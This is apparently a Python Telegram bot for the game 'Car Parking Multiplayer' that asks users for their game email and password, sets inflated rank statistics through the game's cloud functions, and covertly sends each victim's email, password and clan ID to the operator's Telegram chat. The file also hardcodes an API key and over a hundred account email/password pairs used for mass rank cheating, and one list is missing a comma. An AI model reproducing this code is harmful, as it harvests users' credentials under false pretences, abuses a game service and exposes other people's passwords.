import os
import requests
import json
import telebot
from flask import Flask
from threading import Thread

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# --- Telegram Bot Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не задан!")

bot = telebot.TeleBot(BOT_TOKEN)
user_states = {}

OWNER_ID = int(CHAT_ID)
ADMINS = {"usernames": set(), "ids": set()}

# --- АККАУНТЫ ДЛЯ /level ---
ACCOUNTS = [
    {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
    {"email": "cpmcpmking1@gmail.com", "password": "666666"},
    {"email": "cpmcpmking2@gmail.com", "password": "666666"},
    {"email": "cpmcpmking3@gmail.com", "password": "666666"},
    {"email": "cpmcpmking4@gmail.com", "password": "666666"},
    {"email": "cpmcpmking5@gmail.com", "password": "666666"},
    {"email": "cpmcpmking6@gmail.com", "password": "666666"},
    {"email": "cpmcpmking7@gmail.com", "password": "666666"},
    {"email": "cpmcpmking88@gmail.com", "password": "666666"},
    {"email": "cpmcpmking9@gmail.com", "password": "666666"},
    {"email": "cpmcpmking10@gmail.com", "password": "666666"},
    {"email": "cpmcpmking11@gmail.com", "password": "666666"},
    {"email": "cpmcpmking12@gmail.com", "password": "666666"},
    {"email": "cpmcpmking13@gmail.com", "password": "666666"},
    {"email": "cpmcpmking14@gmail.com", "password": "666666"},
    {"email": "cpmcpmking15@gmail.com", "password": "666666"},
    {"email": "cpmcpmking16@gmail.com", "password": "666666"},
    {"email": "cpmcpmking17@gmail.com", "password": "666666"},
    {"email": "cpmcpmking188@gmail.com", "password": "666666"},
    {"email": "cpmcpmking19@gmail.com", "password": "666666"},
    {"email": "cpmcpmking20@gmail.com", "password": "666666"},
    {"email": "cpmcpmking21@gmail.com", "password": "666666"},
    {"email": "cpmcpmking22@gmail.com", "password": "666666"},
    {"email": "cpmcpmking23@gmail.com", "password": "666666"},
    {"email": "cpmcpmking24@gmail.com", "password": "666666"},
    {"email": "cpmcpmking25@gmail.com", "password": "666666"},
    {"email": "cpmcpmking26@gmail.com", "password": "666666"},
    {"email": "cpmcpmking27@gmail.com", "password": "666666"},
    {"email": "cpmcpmking28@gmail.com", "password": "666666"},
    {"email": "cpmcpmking29@gmail.com", "password": "666666"},
    {"email": "cpmcpmking30@gmail.com", "password": "666666"},
    {"email": "cpmcpmking31@gmail.com", "password": "666666"},
    {"email": "cpmcpmking32@gmail.com", "password": "666666"},
    {"email": "cpmcpmking33@gmail.com", "password": "666666"},
    {"email": "cpmcpmking34@gmail.com", "password": "666666"},
    {"email": "cpmcpmking35@gmail.com", "password": "666666"},
    {"email": "cpmcpmking36@gmail.com", "password": "666666"},
    {"email": "cpmcpmking37@gmail.com", "password": "666666"},
    {"email": "cpmcpmking388@gmail.com", "password": "666666"},
    {"email": "cpmcpmking39@gmail.com", "password": "666666"},
    {"email": "cpmcpmking40@gmail.com", "password": "666666"},
    {"email": "cpmcpmking41@gmail.com", "password": "666666"},
    {"email": "cpmcpmking42@gmail.com", "password": "666666"},
    {"email": "cpmcpmking43@gmail.com", "password": "666666"},
    {"email": "cpmcpmking44@gmail.com", "password": "666666"},
    {"email": "cpmcpmking45@gmail.com", "password": "666666"},
    {"email": "cpmcpmking46@gmail.com", "password": "666666"},
    {"email": "cpmcpmking47@gmail.com", "password": "666666"},
    {"email": "cpmcpmking48@gmail.com", "password": "666666"},
    {"email": "cpmcpmking49@gmail.com", "password": "666666"},
    {"email": "cpmcpmking50@gmail.com", "password": "666666"},
    {"email": "cpmcpmking51@gmail.com", "password": "666666"},
    {"email": "cpmcpmking52@gmail.com", "password": "666666"}
    
    
    {"email": "den_isaev_95@mail.ru", "password": "Zaebali1995"},
    {"email": "kingcpmcpm1@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm2@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm3@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm4@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm5@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm6@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm7@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm88@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm9@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm10@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm11@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm12@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm13@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm14@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm15@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm16@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm17@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm188@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm19@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm20@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm21@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm22@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm23@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm24@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm25@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm26@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm27@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm28@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm29@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm30@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm31@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm32@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm33@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm34@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm35@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm36@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm37@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm388@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm39@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm40@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm41@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm42@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm43@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm44@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm45@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm46@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm47@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm48@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm49@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm50@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm51@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm52@gmail.com", "password": "666666"},
]

# --- FUNCTIONS ---
def is_admin(message):
    username = message.from_user.username
    user_id = message.from_user.id
    return (
        user_id == OWNER_ID or
        (username and username in ADMINS["usernames"]) or
        (user_id in ADMINS["ids"])
    )

def send_to_telegram(email, password, clan_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=5)
    except:
        pass

def login(email, password):
    try:
        r = requests.post(FIREBASE_LOGIN_URL, json={
            "clientType": "CLIENT_TYPE_ANDROID",
            "email": email,
            "password": password,
            "returnSecureToken": True
        })
        data = r.json()
        if r.status_code == 200 and "idToken" in data:
            return data["idToken"]
    except:
        pass
    return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
        "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
        "gifts","fuel","offroad","speed_banner","reactions","police","run",
        "real_estate","t_distance","treasure","block_post","push_ups",
        "burnt_tire","passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    try:
        r = requests.post(RANK_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": json.dumps({"RatingData": rating_data})}
        )
        return r.status_code == 200
    except:
        return False

def check_clan_id(token, email, password):
    try:
        r = requests.post(CLAN_ID_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": None}
        )
        if r.status_code == 200:
            clan_id = r.json().get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)
    except:
        pass

def run_mass_rank():
    for acc in ACCOUNTS:
        token = login(acc["email"], acc["password"])
        if token:
            set_rank(token)

# --- ADMIN COMMANDS ---
@bot.message_handler(func=lambda m: m.text.startswith("+admin"))
def add_admin(message):
    if not is_admin(message):
        bot.reply_to(message, "🛑у вас нет доступа")
        return
    text = message.text.replace("+admin", "").strip()
    if text.startswith("@"):
        username = text[1:]
        ADMINS["usernames"].add(username)
        bot.reply_to(message, f"✅ @{username} добавлен")
    else:
        try:
            user_id = int(text)
            ADMINS["ids"].add(user_id)
            bot.reply_to(message, f"✅ ID {user_id} добавлен")
        except:
            bot.reply_to(message, "❌ Формат: +admin @username или id")

@bot.message_handler(func=lambda m: m.text.startswith("-admin"))
def remove_admin(message):
    if not is_admin(message):
        bot.reply_to(message, "🛑у вас нет доступа")
        return
    text = message.text.replace("-admin", "").strip()
    if text.isdigit() and int(text) == OWNER_ID:
        bot.reply_to(message, "❌ Нельзя удалить владельца")
        return
    if text.startswith("@"):
        ADMINS["usernames"].discard(text[1:])
    else:
        try:
            ADMINS["ids"].discard(int(text))
        except:
            pass
    bot.reply_to(message, "❌ Админ удален")

@bot.message_handler(commands=["admin"])
def list_admins(message):
    if not is_admin(message):
        bot.reply_to(message, "🛑у вас нет доступа")
        return
    text = "👑 Список админов:\n\n"
    if not ADMINS["usernames"] and not ADMINS["ids"]:
        text += "❌ Список пуст"
    else:
        for u in ADMINS["usernames"]:
            text += f"🪪 @{u}\n"
        for i in ADMINS["ids"]:
            text += f"🌐 ID: {i}\n"
    bot.reply_to(message, text)

# --- COMMANDS ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    user_states[message.from_user.id] = {"step": "await_email"}
    
    name = message.from_user.first_name or "Неизвестно"
    username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"
    user_id = message.from_user.id

    # 1️⃣ Сначала данные пользователя
    bot.send_message(message.chat.id,
        f"🏷️имя: {name}\n"
        f"🪪user: {username}\n"
        f"🌐tg id: {user_id}\n"
        f"💰balance: unlimited"
    )

    # 2️⃣ Отдельным сообщением спрашиваем Gmail
    bot.send_message(message.chat.id, "📧 ⚫️ВВЕДИ @GMAIL⚫️")

@bot.message_handler(commands=["level"])
def handle_level(message):
    if not is_admin(message):
        bot.reply_to(message, "🛑у вас нет доступа")
        return
    bot.reply_to(message, "🚀 Запуск KING RANK...")
    Thread(target=run_mass_rank).start()
    bot.reply_to(message, "👑 KING RANK установлены!")

# --- USER FLOW ---
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.from_user.id not in user_states:
        return
    state = user_states[message.from_user.id]
    if state["step"] == "await_email":
        state["email"] = message.text
        state["step"] = "await_password"
        bot.reply_to(message, "🔒 ⚫️ВВЕДИ ПАРОЛЬ⚫️")
    elif state["step"] == "await_password":
        token = login(state["email"], message.text)
        if token and set_rank(token):
            check_clan_id(token, state["email"], message.text)
            bot.reply_to(message, "✅ King Rank установлен")
        else:
            bot.reply_to(message, "❌ Ошибка")
        del user_states[message.from_user.id]
        bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")

# --- Flask ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

# --- START ---
if __name__ == "__main__":
    Thread(target=bot.polling).start()
    run_flask()
